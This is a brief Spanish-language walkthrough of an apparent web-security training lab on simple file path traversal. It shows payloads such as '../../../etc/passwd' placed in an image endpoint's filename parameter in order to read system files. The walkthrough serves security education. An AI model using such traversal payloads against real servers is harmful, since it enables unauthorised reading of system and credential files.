# 01 Lab: File path traversal, simple case

## Objetivo

```bash
This lab contains a path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

## Solución

1. Verificamos la aplicación y el funcionamiento.

[https://0a8d007b04dee1ae81b14d89002500e0.web-security-academy.net/image?filename=36.jpg](https://0a8d007b04dee1ae81b14d89002500e0.web-security-academy.net/image?filename=36.jpg)

![image.png](01%20Lab%20File%20path%20traversal,%20simple%20case%2017efab5460ec80e7b618de0f2e2c1c88/image.png)

1. Modificamos el parámetro `filename` en las consultas usando el siguiente payload.

```bash
../../../etc/crontab
```

![image.png](01%20Lab%20File%20path%20traversal,%20simple%20case%2017efab5460ec80e7b618de0f2e2c1c88/image%201.png)

```bash
../../../etc/passwd
```

![image.png](01%20Lab%20File%20path%20traversal,%20simple%20case%2017efab5460ec80e7b618de0f2e2c1c88/image%202.png)